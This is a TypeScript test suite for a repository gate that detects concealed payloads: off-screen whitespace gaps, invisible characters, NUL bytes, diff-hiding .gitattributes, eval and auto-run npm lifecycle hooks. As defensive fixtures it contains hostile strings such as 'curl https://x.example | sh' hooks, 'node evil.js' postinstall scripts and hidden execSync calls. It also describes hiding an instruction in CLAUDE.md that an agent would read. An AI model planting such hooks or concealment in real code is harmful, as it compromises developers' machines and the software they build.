/**
 * Behavioural tests for scripts/check-concealment.ts — the `check:concealment`
 * gate in `bun run check`.
 *
 * Context: better-auth PR #6003 hid a loader in `demo/nextjs/postcss.config.mjs`
 * by appending it after ~800 tab characters, so the rendered diff line ended at
 * `};` and the payload sat off-screen to the right. A later commit in the same
 * PR deleted it, so the combined "Files changed / All commits" diff — the view
 * maintainers actually review from — showed only a trailing-newline change. The
 * payload never had to be merged: it only had to survive on the branch long
 * enough for CI or a maintainer's local build to run it once.
 *
 * Every payload here is built from char codes and `repeat()` rather than pasted
 * literally, because `tests/` is itself in the gate's scope — a literal
 * zero-width space in this file would trip the checker it is testing. Keep it
 * that way: this file must stay pure ASCII apart from the emoji fixture.
 *
 * Each guard gets a test that fails if that guard alone is deleted. Coverage of
 * a guard is not the same as detection of its removal (see #596): a suite that
 * only ever feeds clean input executes every branch and still passes with the
 * whole checker commented out.
 */
import { describe, expect, test } from 'bun:test';
import { mkdtemp, mkdir, rm, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { fileURLToPath } from 'node:url';

const SCRIPT = fileURLToPath(new URL('../../scripts/check-concealment.ts', import.meta.url));
const REAL_ROOT = fileURLToPath(new URL('../../', import.meta.url));

/** Built from char codes so this source file stays free of the very characters it tests. */
const ZWSP = String.fromCharCode(0x200b);
const ZWJ = String.fromCharCode(0x200d);
const RLO = String.fromCharCode(0x202e);
const SHRUG = String.fromCodePoint(0x1f937);
const MALE_SIGN = String.fromCharCode(0x2642);
const VS16 = String.fromCharCode(0xfe0f);
const SOFT_HYPHEN = String.fromCharCode(0x00ad);
const NUL = String.fromCharCode(0);

/** A line carrying both a 60-space gap and an eval() — trips two rules at once. */
const concealed = `echo ok${' '.repeat(60)}eval("x")${' # '}${'x'.repeat(80)}\n`;

interface Result {
  code: number;
  stdout: string;
  stderr: string;
}

async function runCheck(root: string, args: string[] = []): Promise<Result> {
  const proc = Bun.spawn(['bun', 'run', SCRIPT, ...args], {
    // Same reason as withGitTree's cleanEnv: a pre-push run sets GIT_DIR, and
    // leaking it makes the gate resolve to the ambient repo instead of `root`.
    env: Object.fromEntries([
      ...Object.entries(process.env).filter(([k]) => !k.startsWith('GIT_')),
      ['CHECK_CONCEALMENT_ROOT', root],
    ]) as Record<string, string>,
    stdout: 'pipe',
    stderr: 'pipe',
  });
  const [stdout, stderr] = await Promise.all([
    new Response(proc.stdout).text(),
    new Response(proc.stderr).text(),
  ]);
  return { code: await proc.exited, stdout, stderr };
}

/** Build a synthetic repo root from a path->contents map, run the gate, clean up. */
async function withTree(
  files: Record<string, string>,
  // `void` alone would silently accept an async callback and drop its
  // assertions — the test would pass no matter what it asserted.
  assertions: (result: Result) => void | Promise<void>
): Promise<void> {
  const dir = await mkdtemp(join(tmpdir(), 'concealment-'));
  try {
    for (const [name, contents] of Object.entries(files)) {
      const path = join(dir, name);
      await mkdir(join(path, '..'), { recursive: true });
      await writeFile(path, contents);
    }
    await assertions(await runCheck(dir));
  } finally {
    await rm(dir, { recursive: true, force: true });
  }
}

const CLEAN = 'export const answer = 42;\n';

async function withGitTree(
  files: Record<string, string>,
  assertions: (result: Result) => void | Promise<void>,
  // Written AFTER the commit. `git add -A` honours .gitignore, so a file
  // listed in it at seed time is never tracked at all — which is a different
  // scenario from "tracked, then later ignored".
  afterCommit: Record<string, string> = {}
): Promise<void> {
  const dir = await mkdtemp(join(tmpdir(), 'concealment-git-'));
  try {
    for (const [name, contents] of Object.entries(files)) {
      const path = join(dir, name);
      await mkdir(join(path, '..'), { recursive: true });
      await writeFile(path, contents);
    }
    // Clear inherited git plumbing vars for the same reason the gate does:
    // under a pre-push hook GIT_DIR is set, and `git -C <dir>` does NOT
    // override it — `git init` here would operate on the ambient repo
    // instead of this scratch tree, and the tests would silently describe
    // the wrong repository.
    const cleanEnv: Record<string, string> = {};
    for (const [k, v] of Object.entries(process.env)) {
      if (k.startsWith('GIT_')) continue;
      if (v !== undefined) cleanEnv[k] = v;
    }
    const git = (...args: string[]): void => {
      const r = Bun.spawnSync(['git', '-C', dir, ...args], { env: cleanEnv });
      if (r.exitCode !== 0) throw new Error(`git ${args.join(' ')} failed`);
    };
    git('init', '-q');
    git('config', 'user.email', 'test@example.com');
    git('config', 'user.name', 'test');
    git('add', '-A');
    git('commit', '-qm', 'seed', '--no-gpg-sign');
    for (const [name, contents] of Object.entries(afterCommit)) {
      const path = join(dir, name);
      await mkdir(join(path, '..'), { recursive: true });
      await writeFile(path, contents);
    }
    await assertions(await runCheck(dir));
  } finally {
    await rm(dir, { recursive: true, force: true });
  }
}

describe('clean input', () => {
  test('passes on an ordinary source tree', async () => {
    await withTree({ 'src/a.ts': CLEAN, 'src/nested/b.ts': CLEAN }, ({ code, stdout }) => {
      expect(code).toBe(0);
      expect(stdout).toContain('check-concealment');
    });
  });

  test('passes on the real repository tree', async () => {
    // Regression guard: the gate must land green on this repo, or it will be
    // disabled rather than fixed the first time it blocks a merge.
    const { code, stderr } = await runCheck(REAL_ROOT);
    expect(stderr).toBe('');
    expect(code).toBe(0);
  });
});

describe('horizontal concealment', () => {
  test('flags a payload pushed off-screen by a run of spaces', async () => {
    await withTree(
      { 'src/config.ts': `};${' '.repeat(300)}globalThis.x = 1;\n` },
      ({ code, stderr }) => {
        expect(code).toBe(1);
        expect(stderr).toContain('src/config.ts');
        expect(stderr).toContain('whitespace');
      }
    );
  });

  test('flags a run of tabs, the better-auth variant', async () => {
    await withTree(
      { 'src/config.ts': `};${'\t'.repeat(120)}globalThis.x = 1;\n` },
      ({ code, stderr }) => {
        expect(code).toBe(1);
        expect(stderr).toContain('whitespace');
      }
    );
  });

  test('allows ordinary indentation and short alignment gaps', async () => {
    await withTree(
      { 'src/a.ts': `const x = 1;${' '.repeat(8)}// aligned trailing comment\n` },
      ({ code }) => expect(code).toBe(0)
    );
  });

  test('allows a wide gap when the line still ends on screen', async () => {
    // This repo aligns JSDoc continuations with gaps well over the run
    // threshold. Those lines are reviewable because they end where you can see
    // them, so the gap alone must not be enough to fail — otherwise the gate
    // gets switched off the first time someone formats a comment block.
    const aligned = ` *${' '.repeat(28)}falls back to the env var or the default`;
    expect(aligned.length).toBeLessThan(120);
    await withTree({ 'src/a.ts': `${aligned}\n` }, ({ code }) => expect(code).toBe(0));
  });

  test('flags an over-long line even without a whitespace run', async () => {
    await withTree({ 'src/a.ts': `const s = '${'A'.repeat(500)}';\n` }, ({ code, stderr }) => {
      expect(code).toBe(1);
      expect(stderr).toContain('long line');
    });
  });

  test('ignores long lines in Markdown, which is prose and is not executed', async () => {
    await withTree({ 'docs/notes.md': `${'word '.repeat(200)}\n` }, ({ code }) =>
      expect(code).toBe(0)
    );
  });

  test('exempts generated files from the long-line rule', async () => {
    // src/core/graphql/operations.generated.ts is one string per operation and
    // runs to ~1750 columns. It is machine-written and reviewed as a whole.
    await withTree(
      { 'src/ops.generated.ts': `export const Q = '${'x'.repeat(900)}';\n` },
      ({ code }) => expect(code).toBe(0)
    );
  });

  test('still applies the whitespace rule inside generated files', async () => {
    // The long-line exemption must not become a hiding place: a gap-based
    // payload appended to a generated file is still concealment.
    await withTree(
      { 'src/ops.generated.ts': `const Q = '';${' '.repeat(200)}globalThis.x = 1;\n` },
      ({ code, stderr }) => {
        expect(code).toBe(1);
        expect(stderr).toContain('whitespace');
      }
    );
  });
});

describe('scope', () => {
  test('skips vendored directories', async () => {
    await withTree({ 'node_modules/pkg/index.js': `eval(x);\n` }, ({ code }) =>
      expect(code).toBe(0)
    );
  });

  test('skips binary files rather than reporting noise from them', async () => {
    // A NUL byte marks it binary; the soft hyphens after it would otherwise be
    // reported as invisible characters on every line.
    //
    // The path changed from src/blob.json to an actual binary extension when
    // the NUL free-pass was closed (Fable review): a NUL in a .json is no
    // longer "binary, therefore skip" — it is now a finding, because such a
    // file still parses and executes while git shows the reviewer nothing.
    // Quiet-skipping is now scoped to extensions where a NUL is expected.
    const binary = `PK${NUL}${NUL}${SOFT_HYPHEN.repeat(50)}`;
    await withTree({ 'docs/blob.png': binary }, ({ code }) => expect(code).toBe(0));
  });

  test('skips lockfiles, which are generated and covered by check:deps-pinned', async () => {
    await withTree({ 'package-lock.json': `{"x":"${'A'.repeat(600)}"}\n` }, ({ code }) =>
      expect(code).toBe(0)
    );
  });
});

// Regression cover for the two allowlist holes found by the 2026-08-29
// completeness-guard audit (docs/audits/2026-08-29-completeness-guard-audit.md
// F1 and F2). Both were the same defect this gate exists to catch: the gate
// enumerated what to CHECK instead of what to SKIP, so anything it had not
// predicted was invisible.
/**
 * The gate lists files from git when it can, falling back to a filesystem walk
 * outside a repo. Every other test in this file drives the FALLBACK, because
 * withTree builds a plain temp directory — so without this block the path that
 * actually runs in production would be untested, which is the same shape of
 * hole the audit that prompted these tests was about.
 */
describe('file list comes from git when available (review follow-up)', () => {
  test('a gitignored tree is not scanned', async () => {
    // The real exposure: removing the extension allowlist put snapshots/,
    // local fixture databases and .env.local in scope on developer machines.
    // Decoding a multi-hundred-MB LevelDB blob to a string before the NUL
    // check discards it is wasteful, and a long JWT line in .env.local would
    // fail the gate with a finding no PR could resolve.
    await withGitTree(
      { '.gitignore': 'secrets/\n', 'src/a.ts': 'const a = 1;\n', 'secrets/blob.ts': concealed },
      ({ code }) => expect(code).toBe(0)
    );
  });

  test('a tracked file is still scanned', async () => {
    await withGitTree({ 'src/a.ts': concealed }, ({ code, stderr }) => {
      expect(code).toBe(1);
      expect(stderr).toContain('src/a.ts');
    });
  });

  test('an untracked but unignored file is scanned — it can still reach a diff', async () => {
    // `added-later.ts` MUST go through afterCommit. Writing it in the `files`
    // map put it in the seed commit, so it was tracked — and the test passed
    // even with the untracked listing removed entirely. It executed the guard
    // without detecting anything, which is the vacuous-assertion class this
    // repo names explicitly. Caught in review, not by the suite.
    await withGitTree(
      { 'src/a.ts': 'const a = 1;\n' },
      ({ code, stderr }) => {
        expect(code).toBe(1);
        expect(stderr).toContain('added-later');
      },
      { 'src/added-later.ts': concealed }
    );
  });

  test('gitignoring an already-tracked file does not hide it', async () => {
    // The property that makes this not an allowlist: .gitignore cannot be used
    // to evade the gate, because ignoring a committed file does not untrack it.
    await withGitTree(
      { 'src/a.ts': concealed },
      ({ code, stderr }) => {
        expect(code).toBe(1);
        expect(stderr).toContain('src/a.ts');
      },
      { '.gitignore': 'src/a.ts\n' }
    );
  });
});

describe('scope is not an extension allowlist (audit F2)', () => {
  test('scans a file with no extension at all', async () => {
    // The live exposure was .husky/pre-push, which runs on every developer
    // push. Under the old SCOPED_EXTENSIONS allowlist, inScope() required a
    // dot, so an extensionless file was never opened.
    await withTree({ 'scripts/pre-push': concealed }, ({ code, stderr }) => {
      expect(code).toBe(1);
      expect(stderr).toContain('pre-push');
    });
  });

  test('scans an extension nobody thought to allowlist', async () => {
    await withTree({ 'scripts/probe.rb': concealed }, ({ code }) => expect(code).toBe(1));
  });

  test('prose keeps the invisible-character rule', async () => {
    // Relaxing prose must not relax it into a blind spot: a zero-width
    // character in a README is never benign.
    await withTree({ 'README.md': `Hello${ZWSP} world\n` }, ({ code, stderr }) => {
      expect(code).toBe(1);
      expect(stderr).toContain('U+200B');
    });
  });

  test('a whitespace-run payload in markdown is reported', async () => {
    // Prose loses the long-line and dynamic-execution rules, not this one.
    // Markdown here is not only read by humans: CLAUDE.md and skills/**/*.md
    // are instruction files an agent reads in full, so a gap that pushes an
    // instruction off the right edge of the diff is concealment in exactly the
    // sense this gate means — invisible to the reviewer, load-bearing to the
    // reader. Markdown's one legitimate whitespace idiom, the trailing double
    // space that forces a line break, sits at end-of-line and cannot match
    // \S[gap]{20,}\S.
    //
    // The fixture must clear CONCEALED_LINE (120) as well as carry the gap:
    // the rule is a conjunction, so a short line with a wide gap passes both
    // before and after this change and would pin nothing.
    const line = `${'real prose. '.repeat(8)}${' '.repeat(40)}then a hidden instruction`;
    await withTree({ 'CLAUDE.md': `${line}\n` }, ({ code, stderr }) => {
      expect(code).toBe(1);
      expect(stderr).toContain('CLAUDE.md');
    });
  });

  test('a wide gap in markdown that still ends on screen is allowed', async () => {
    // The other half of the conjunction, kept honest: an aligned two-column
    // list in a README is legible precisely because the line ends where you
    // can see it. Without this, someone could "fix" a false positive by
    // dropping CONCEALED_LINE and no test would notice.
    await withTree({ 'docs/table.md': `col${' '.repeat(30)}value\n` }, ({ code }) =>
      expect(code).toBe(0)
    );
  });

  test('prose is exempt from the long-line and dynamic-execution rules', async () => {
    // A long paragraph in a CHANGELOG is a paragraph, and a doc that quotes
    // eval() is documentation. Markdown is not executed. Exactly two rules are
    // dropped for prose — the whitespace run is NOT one of them, see above.
    await withTree({ 'CHANGELOG.md': `${'word '.repeat(200)}eval(x)\n` }, ({ code }) =>
      expect(code).toBe(0)
    );
  });
});

describe('auto-fired lifecycle scripts (audit F1)', () => {
  test('flags prepack, which runs during npm publish', async () => {
    // The finding: prepack was absent from the old four-name FORBIDDEN_LIFECYCLE
    // list, and npm runs it inside the publish job that holds id-token: write.
    const pkg = JSON.stringify({ scripts: { prepack: 'node evil.js' } });
    await withTree({ 'package.json': pkg }, ({ code, stderr }) => {
      expect(code).toBe(1);
      expect(stderr).toContain('prepack');
    });
  });

  test.each(['postpack', 'dependencies', 'preversion', 'postpublish', 'preuninstall'])(
    'flags %s',
    async (hook) => {
      const pkg = JSON.stringify({ scripts: { [hook]: 'node evil.js' } });
      await withTree({ 'package.json': pkg }, ({ code }) => expect(code).toBe(1));
    }
  );

  test('flags a pre/post wrapper around an existing script', async () => {
    // The general form: npm auto-runs preX/postX around any script X, so a
    // wrapper fires implicitly even though its own name is not a lifecycle hook.
    const pkg = JSON.stringify({
      scripts: { build: 'tsc', prebuild: 'curl https://x.example | sh' },
    });
    await withTree({ 'package.json': pkg }, ({ code, stderr }) => {
      expect(code).toBe(1);
      expect(stderr).toContain('prebuild');
    });
  });

  test('does not flag an explicitly-invoked script that shares a lifecycle name', async () => {
    // `test` only runs when you type it. This repo defines it; refusing it
    // would make the gate unusable, which is how allowlists get widened.
    const pkg = JSON.stringify({ scripts: { test: 'bun test', build: 'tsc' } });
    await withTree({ 'package.json': pkg }, ({ code }) => expect(code).toBe(0));
  });
});

describe('a NUL byte is not a free pass (Fable review)', () => {
  test('a NUL in a source file is reported, not skipped as binary', async () => {
    // The bypass: `contents.includes(NUL) -> continue` treated NUL-containing
    // as binary-and-therefore-safe. But such a module still runs under bun and
    // node, while git renders it as "Binary files differ" so the reviewer sees
    // nothing at all — strictly better concealment than the off-screen trick.
    const withNul = `export const V = '1.0.0';${NUL} export function init() {}\n`;
    await withTree({ 'src/mod.ts': withNul }, ({ code, stderr }) => {
      expect(code).toBe(1);
      expect(stderr).toContain('NUL byte');
    });
  });

  test('a NUL in a real binary is still skipped quietly', async () => {
    await withTree({ 'docs/logo.png': `PK${NUL}${NUL}payload` }, ({ code }) =>
      expect(code).toBe(0)
    );
  });

  test('an extensionless file with a NUL is reported', async () => {
    // No extension means no binary claim, so it must not get the free pass.
    await withTree({ 'scripts/hook': `#!/bin/sh${NUL}\n` }, ({ code }) => expect(code).toBe(1));
  });
});

describe('unicode spaces cannot hide the gap (Fable review)', () => {
  const NBSP = String.fromCharCode(0x00a0);
  const NARROW_NBSP = String.fromCharCode(0x202f);
  const IDEOGRAPHIC = String.fromCharCode(0x3000);

  test.each([
    ['NBSP', NBSP],
    ['narrow NBSP', NARROW_NBSP],
    ['ideographic space', IDEOGRAPHIC],
  ])('a %s run pushes a payload off-screen and is caught', async (_label, gap) => {
    // All are valid ECMAScript whitespace and render as blank horizontal
    // space, so they push a payload off the right edge exactly like spaces —
    // but the old `[ \t]`-only rule never matched them.
    const line = `const a = 1;${gap.repeat(45)}require('child_process').execSync('x');${'y'.repeat(60)}\n`;
    await withTree({ 'src/a.ts': line }, ({ code, stderr }) => {
      expect(code).toBe(1);
      expect(stderr).toContain('whitespace run');
    });
  });
});

describe('nested manifests and .mdx (Fable review)', () => {
  test('a lifecycle script in a workspace package.json is caught', async () => {
    // Workspace installs run sub-package lifecycle scripts; only the root
    // manifest was being checked.
    const pkg = JSON.stringify({ scripts: { postinstall: 'node evil.js' } });
    await withTree({ 'packages/sub/package.json': pkg }, ({ code, stderr }) => {
      expect(code).toBe(1);
      expect(stderr).toContain('postinstall');
    });
  });

  test('.mdx keeps the code rules — it compiles to JS', async () => {
    await withTree(
      { 'docs/page.mdx': `export const x = 1;${' '.repeat(60)}eval(y);${'z'.repeat(80)}\n` },
      ({ code }) => expect(code).toBe(1)
    );
  });
});

describe('diff-suppressing gitattributes (Fable review, item 1)', () => {
  test.each([
    ['binary', 'src/payload.ts binary'],
    ['-diff', 'src/payload.ts -diff'],
    ['linguist-generated', 'src/payload.ts linguist-generated=true'],
    // A glob, since the binary allowance operates on globs — this is the shape
    // the rule actually has to keep rejecting.
    ['a glob pattern', '*.ts binary'],
  ])('flags %s', async (_label, line) => {
    // The same class as the NUL bypass reached without a NUL: one tracked
    // .gitattributes line makes git and GitHub print "Binary files differ" (or
    // fold the diff), so the payload file itself can be plain, valid,
    // NUL-free TypeScript and every other rule in this gate passes.
    await withTree(
      { '.gitattributes': `${line}\n`, 'src/payload.ts': 'const a = 1;\n' },
      ({ code, stderr }) => {
        expect(code).toBe(1);
        expect(stderr).toContain('gitattribute');
      }
    );
  });

  test('leaves the legitimate attributes alone', async () => {
    // text=auto / eol=lf / linguist-language do not hide content, which is why
    // the rule refuses the suppressing attributes rather than allow-listing
    // the safe ones.
    const attrs = '* text=auto eol=lf\n*.ts linguist-language=TypeScript\n# a comment\n';
    await withTree({ '.gitattributes': attrs }, ({ code }) => expect(code).toBe(0));
  });

  test('checks a nested .gitattributes too', async () => {
    await withTree({ 'src/.gitattributes': 'payload.ts binary\n' }, ({ code }) =>
      expect(code).toBe(1)
    );
  });
});

describe('scoping follow-ups (review of #679)', () => {
  test('a tracked file under a SKIP_DIRS name is still scanned', async () => {
    // SKIP_DIRS is for UNREVIEWED LOCAL ARTIFACTS. A tracked file is in a diff
    // by definition — excluding build/loader.ts by directory name would turn a
    // list of vendored-output names into a list of places a payload can sit
    // unwatched, which is the shape this gate argues against.
    await withGitTree({ 'build/loader.ts': concealed }, ({ code, stderr }) => {
      expect(code).toBe(1);
      expect(stderr).toContain('build/loader.ts');
    });
  });

  test('an untracked file under a SKIP_DIRS name is skipped', async () => {
    // The other half: local build output must not produce findings nobody can fix.
    await withGitTree({ 'src/a.ts': 'const a = 1;\n' }, ({ code }) => expect(code).toBe(0), {
      'build/generated.ts': concealed,
    });
  });

  test('a FILE named like a skipped directory is scanned', async () => {
    // An extensionless `scripts/build` is a shell script — the same shape as
    // .husky/pre-push. Matching SKIP_DIRS against the basename dropped it.
    await withTree({ 'scripts/build': concealed }, ({ code, stderr }) => {
      expect(code).toBe(1);
      expect(stderr).toContain('scripts/build');
    });
  });

  test('an untracked FILE named like a skipped directory is scanned (git path)', async () => {
    // The sibling test above covers the walk. This covers the git path's own
    // segment test, which must also mean "directory segment" — `scripts/build`
    // is a shell script, not a build directory.
    await withGitTree(
      { 'src/a.ts': 'const a = 1;\n' },
      ({ code, stderr }) => {
        expect(code).toBe(1);
        expect(stderr).toContain('scripts/build');
      },
      { 'scripts/build': concealed }
    );
  });

  test('a mid-line # in a gitattributes path is not a comment', async () => {
    // gitattributes(5): only lines BEGINNING with # are ignored. Stripping
    // from any # parsed `src/pay#load.ts binary` down to `src/pay`, matched
    // nothing, and left the real file diff-suppressed.
    await withTree({ '.gitattributes': 'src/pay#load.ts binary\n' }, ({ code, stderr }) => {
      expect(code).toBe(1);
      expect(stderr).toContain('gitattribute');
    });
  });

  test.each([
    ['NBSP', String.fromCharCode(0x00a0)],
    ['form feed', '\f'],
    ['vertical tab', '\v'],
  ])('a line starting with %s then # is NOT a comment to git', async (_label, lead) => {
    // git skips only spaces and tabs before the `#` test, so this is a real
    // pattern to git. JS .trim() stripped these and read it as a comment —
    // the mirror image of the mid-line-# bug fixed alongside it.
    await withTree({ '.gitattributes': `${lead}# payload.ts binary\n` }, ({ code }) =>
      expect(code).toBe(1)
    );
  });

  test('an NBSP in the pattern does not tokenize it into the allowance', async () => {
    // git splits pattern from attributes on spaces and tabs ONLY, so the real
    // pattern here is `evil.png<NBSP>run.ts` — a .ts file, not inert, and its
    // diff must not be suppressed. Splitting on JS \s truncated it to
    // `evil.png`, which IS inert, and the allowance let it through. Fails
    // open, which is why it is pinned.
    const nbsp = String.fromCharCode(0x00a0);
    await withTree({ '.gitattributes': `evil.png${nbsp}run.ts binary\n` }, ({ code }) =>
      expect(code).toBe(1)
    );
  });

  test('a quoted pattern does not tokenize into the allowance', async () => {
    // Verified against real git: `"evil run.ts" binary` sets binary on
    // `evil run.ts`. Naive tokenizing yields `"cover.png`, whose extension
    // reads as inert, so the allowance would wave through a .ts file.
    await withTree({ '.gitattributes': '"cover.png run.ts" binary\n' }, ({ code }) =>
      expect(code).toBe(1)
    );
  });

  test('a legitimately quoted binary path is still allowed', async () => {
    // The quoted form is parsed, not refused: `"my docs/logo.png" binary` is
    // legitimate, and refusing every quoted pattern would fail the gate on it.
    await withTree({ '.gitattributes': '"my docs/logo.png" binary\n' }, ({ code }) =>
      expect(code).toBe(0)
    );
  });

  test('a quoted gitattributes pattern with a backslash does not reach the inert allowance', async () => {
    // Stripping backslashes can only SHORTEN the string, so an escape after the
    // last dot manufactures an inert-looking extension git never resolves to:
    // `"evil.p\ng"` reads as `.png` to a naive strip and as a literal newline to
    // git's unquote_c_style. The strip was an approximation of that function and
    // it failed OPEN, so the escape form now misses the allowance entirely.
    await withTree({ '.gitattributes': '"evil.p\\ng" binary\n' }, ({ code, stderr }) => {
      expect(code).toBe(1);
      expect(stderr).toContain('diff-suppressing gitattribute');
    });
  });

  test('an executable binary format is NOT auto-approved', async () => {
    // BINARY_EXTENSIONS answers "where is a NUL expected"; it includes .wasm,
    // .node, .so, .exe. Reusing it here would bless diff suppression on the
    // formats whose whole point is that they execute.
    await withTree({ '.gitattributes': '*.wasm binary\n' }, ({ code }) => expect(code).toBe(1));
  });

  test('a leading # in gitattributes is still a comment', async () => {
    await withTree({ '.gitattributes': '# src/payload.ts binary\n' }, ({ code }) =>
      expect(code).toBe(0)
    );
  });

  test('marking a genuinely binary type is allowed', async () => {
    // *.png binary is standard boilerplate and suppresses a diff nobody could
    // read anyway. Refusing it would fail the gate with advice the author
    // cannot act on.
    await withTree({ '.gitattributes': '*.png binary\n*.pdf binary\n' }, ({ code }) =>
      expect(code).toBe(0)
    );
  });
});

describe('invisible characters', () => {
  test('flags a zero-width space', async () => {
    await withTree({ 'src/a.ts': `const a${ZWSP} = 1;\n` }, ({ code, stderr }) => {
      expect(code).toBe(1);
      expect(stderr).toContain('U+200B');
    });
  });

  test('flags a right-to-left override', async () => {
    await withTree({ 'src/a.ts': `const s = 'x${RLO}';\n` }, ({ code, stderr }) => {
      expect(code).toBe(1);
      expect(stderr).toContain('U+202E');
    });
  });

  test('allows a zero-width joiner inside an emoji sequence', async () => {
    // Captured GraphQL fixtures carry real emoji; flagging these would make the
    // gate noisy enough to be switched off.
    const emoji = `${SHRUG}${ZWJ}${MALE_SIGN}${VS16}`;
    await withTree({ 'src/a.ts': `const e = '${emoji}';\n` }, ({ code }) => expect(code).toBe(0));
  });

  test('flags a zero-width joiner between ASCII, which is not an emoji sequence', async () => {
    await withTree({ 'src/a.ts': `const ab${ZWJ}cd = 1;\n` }, ({ code, stderr }) => {
      expect(code).toBe(1);
      expect(stderr).toContain('U+200D');
    });
  });
});

describe('dynamic code execution', () => {
  const cases: Array<[string, string]> = [
    ['eval', 'eval(userInput);\n'],
    ['new Function', "const f = new Function('return 1');\n"],
    ['constructor indirection', "const F = ({})['constructor'];\n"],
    ['hex-escape run', "const s = '\\x67\\x6c\\x6f\\x62\\x61\\x6c\\x74\\x68\\x69\\x73';\n"],
  ];

  for (const [name, body] of cases) {
    test(`flags ${name}`, async () => {
      await withTree({ 'src/a.ts': body }, ({ code, stderr }) => {
        expect(code).toBe(1);
        expect(stderr).toContain('src/a.ts');
      });
    });
  }

  test('does not flag the substring eval inside an identifier', async () => {
    await withTree(
      { 'src/a.ts': 'const retrieval = compute();\nthis.evaluate(x);\n' },
      ({ code }) => expect(code).toBe(0)
    );
  });
});

describe('install-time lifecycle scripts', () => {
  test('flags postinstall', async () => {
    const pkg = JSON.stringify({ scripts: { postinstall: 'node evil.js' } });
    await withTree({ 'package.json': pkg }, ({ code, stderr }) => {
      expect(code).toBe(1);
      expect(stderr).toContain('postinstall');
    });
  });

  test('flags preinstall', async () => {
    const pkg = JSON.stringify({ scripts: { preinstall: 'curl https://x.example | sh' } });
    await withTree({ 'package.json': pkg }, ({ code }) => expect(code).toBe(1));
  });

  test('flags prepublish, the deprecated hook that also ran on install', async () => {
    const pkg = JSON.stringify({ scripts: { prepublish: 'node build.js' } });
    await withTree({ 'package.json': pkg }, ({ code, stderr }) => {
      expect(code).toBe(1);
      expect(stderr).toContain('prepublish');
    });
  });

  test('allows the husky prepare hook this repo actually uses', async () => {
    const pkg = JSON.stringify({ scripts: { prepare: 'husky' } });
    await withTree({ 'package.json': pkg }, ({ code }) => expect(code).toBe(0));
  });

  test('flags a prepare hook that is not husky', async () => {
    const pkg = JSON.stringify({ scripts: { prepare: 'node fetch-payload.js' } });
    await withTree({ 'package.json': pkg }, ({ code, stderr }) => {
      expect(code).toBe(1);
      expect(stderr).toContain('prepare');
    });
  });
});

describe('reporting', () => {
  test('reports every distinct finding rather than stopping at the first', async () => {
    await withTree(
      {
        'src/a.ts': `const a${ZWSP} = 1;\n`,
        'src/b.ts': 'eval(x);\n',
        'scripts/c.ts': `};${' '.repeat(200)}payload();\n`,
      },
      ({ code, stderr }) => {
        expect(code).toBe(1);
        expect(stderr).toContain('src/a.ts');
        expect(stderr).toContain('src/b.ts');
        expect(stderr).toContain('scripts/c.ts');
      }
    );
  });

  test('names the line number so a finding can be opened directly', async () => {
    await withTree({ 'src/a.ts': `const ok = 1;\nconst bad${ZWSP} = 2;\n` }, ({ stderr }) => {
      expect(stderr).toContain('src/a.ts:2');
    });
  });
});
